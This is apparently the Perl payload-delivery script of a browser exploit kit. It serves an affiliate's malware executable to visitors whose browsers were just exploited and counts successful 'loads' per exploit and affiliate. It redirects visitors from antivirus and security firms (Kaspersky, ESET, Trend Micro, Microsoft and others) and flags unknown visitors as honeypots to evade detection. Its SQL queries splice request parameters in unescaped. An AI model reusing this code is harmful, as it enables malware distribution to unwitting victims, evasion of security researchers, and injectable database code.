#!/usr/bin/perl

#
# Tracking loads by exploits
#

use CGI;
use DBI;
use Geo::IP;
require "config.pl";

$q = new CGI;

$aff = $q->param('aff');
$xplload = $q->param('xplload');
$theip = $ENV{REMOTE_ADDR};
$real_ipadd = $theip;
$gi = Geo::IP->open( 'dep/GeoIPOrg.dat' );
$org_chk = $gi->org_by_addr($real_ipadd);
$org_chk =~ tr/[A-Z]/[a-z]/;

#connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Block known antivirus from quering
$antivporgcheck = $dbh->selectrow_array("SELECT antivp FROM affiliates WHERE affid='$aff'");

$antivpblockcheck = 0;
if($antivporgcheck eq 'yes')
{
  $antivpblockcheck = 1 if($org_chk =~ 'google');
  $antivpblockcheck = 1 if($org_chk =~ 'trend micro');
  $antivpblockcheck = 1 if($org_chk =~ 'kaspersky');
  $antivpblockcheck = 1 if($org_chk =~ 'avast');
  $antivpblockcheck = 1 if($org_chk =~ 'av-test');
  $antivpblockcheck = 1 if($org_chk =~ 'eset');
  $antivpblockcheck = 1 if($org_chk =~ 'sonicwall');
  $antivpblockcheck = 1 if($org_chk =~ 'microsoft');
  $antivpblockcheck = 1 if($org_chk =~ 'vnet s. r. o.');
  $antivpblockcheck = 1 if($org_chk =~ 'kindsight');
  $antivpblockcheck = 1 if($org_chk =~ 'websense');
  $antivpblockcheck = 1 if($org_chk =~ 'theplanet.com');
  $antivpblockcheck = 1 if($org_chk =~ 'level 3 communications');
}

if($antivpblockcheck eq '1')
{
  print "Status: 301 Moved\nLocation: nonexist.html\n\n";
}
else
{

$xplload = 'quicktime_marshaled' if($xplload =~ "quick");


#$sth = $dbh->prepare( "SELECT * FROM affiliates WHERE affid = ?" );
#$sth->execute( $aff );
#$sth->bind_columns( \$id, \$name, \$password, \$affid, \$email, \$cook, \$filez, \$city44, \$blankcheck44, \$windowsonly44, \$googlep44, \$trendmicp, \$kasperskyp, \$avastp, \$avtestp, \$esetp, \$sonicwallp, \$microsoftp );
#$sth->fetch();
#$urltoload = $config{UrlToFolder} . '/dep/' . $config{Exe_default} if($affid eq ""); #old method
#$urltoload = $config{UrlToFolder} . '/dep/' . $filez if($urltoload eq ""); #old method
#$exefilename = $config{Exe_default} if($affid eq "");
#$exefilename = $config{Exe_default} if($affid eq "admin");

$exefilename = $config{Exe_default} if($aff eq "");
$exefilename = $config{Exe_default} if($aff eq "admin");
if($exefilename eq "")
{
  $filez = $dbh->selectrow_array("SELECT filez FROM affiliates WHERE affid='$aff'");
  $exefilename = $filez;
}

open(DLFILE, "<dep/$exefilename");
@fileholder = <DLFILE>;   
close (DLFILE);


#Convert IP
my (@octets,$octet,$ip_number,$number_convert,$ip_address);
$ip_address = $theip;
chomp ($ip_address);
@octets = split(/\./, $ip_address);
$ip_number = 0;
foreach $octet (@octets) {
$ip_number <<= 8;
$ip_number |= $octet;
}

$checkvalueavs = "";
#Check if ip do not exist in database (not serving the exe in this case)
$checkvalueavs = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
$checkvalueavs2 = $dbh->selectrow_array("SELECT loads FROM hosts WHERE ip='$ip_number'");


if($checkvalueavs eq "" or $checkvalueavs eq 'HoneyPot' or $checkvalueavs2 eq '1')
{
  if($checkvalueavs eq "")
  {
    #Insert HoneyPot Value if there's no IP equal in DB
    $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'loads.pl', 'HoneyPot')";
    $statement = $dbh->prepare($sql);
    $statement->execute() or $doubleip = 1;
    $doubleip = 1;
  }

  print "Status: 301 Moved\nLocation: nonexist.html\n\n";
}
else
{

#print "Status: 301 Moved\nLocation: $urltoload \n\n"; #old method

$randomexename = generate_char(int(rand(9)));

print $q->header(-type=> 'application/octet-stream', "Content-Disposition: attachment; filename=$randomexename");
print @fileholder;

$loadingparam = $xplload . '_loads';

$sql = "UPDATE hosts SET exeload='$exefilename' WHERE ip='$ip_number'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Insert the load and loaded exploit parameters if there's an IP equal to $ip_number
$sql = "UPDATE hosts SET loads=1 WHERE ip=$ip_number";
$statement = $dbh->prepare($sql);
$statement->execute(); # or $avschecker = 1;

$sql = "UPDATE hosts SET exploit='$xplload' WHERE ip='$ip_number'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$sql = "UPDATE exploits SET $loadingparam=$loadingparam+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$sql = "UPDATE exploits SET $loadingparam=$loadingparam+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";


}
}

$dbh->disconnect();

sub generate_char
{
 my $wdsize = shift;
 my @alphanumeric = ('a'..'f','1'..'9');
 my $wd = join '',
 map $alphanumeric[rand @alphanumeric], 0..$wdsize;
  return $wd;
}

1;
